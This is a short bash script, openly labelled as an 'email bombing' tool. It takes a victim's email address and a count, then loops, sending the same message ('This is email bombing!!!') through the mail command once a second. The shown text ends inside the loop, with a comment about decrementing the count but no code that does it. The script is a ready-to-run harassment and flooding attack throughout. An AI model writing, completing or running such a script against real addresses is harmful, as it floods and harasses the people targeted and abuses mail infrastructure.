#!/bin/bash

# This script needs a target email address and the limit
# of sent emails
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <email_address> <limit>"
    exit 1
fi

# Check if the first argument is a number using a regular expression
: << COMMENT_ON_REGEX
^-?[0-9]+$: This is a regular expression that checks if the string:
    ^: 		Starts with
    -?: 	An optional negative sign (-)
    [0-9]+: Followed by one or more digits (0-9)
    $: 		Ends with
COMMENT_ON_REGEX

if [[ ! $2 =~ ^-?[0-9]+$ ]]; then
    echo "$2 is not a number."
	exit 1
fi

# Set recipient email address
recipient="$1"
# Set bombing limit
limit="$2" 

# Set subject and body of the email
subject="email bombing you"
body="This is email bombing!!!"

while [ "$limit" -gt 0 ]; do
	# Use the mail command to send the email
	echo "$body" | mail -s "$subject" "$recipient"

	# Check if the mail command was successful
	if [ $? -eq 0 ]; then
	  echo "Email sent successfully."
	else
	  echo "Failed to send email. Check your mail configuration."
	fi

	# Decrement the limit

	# Sleep between mails
	sleep 1
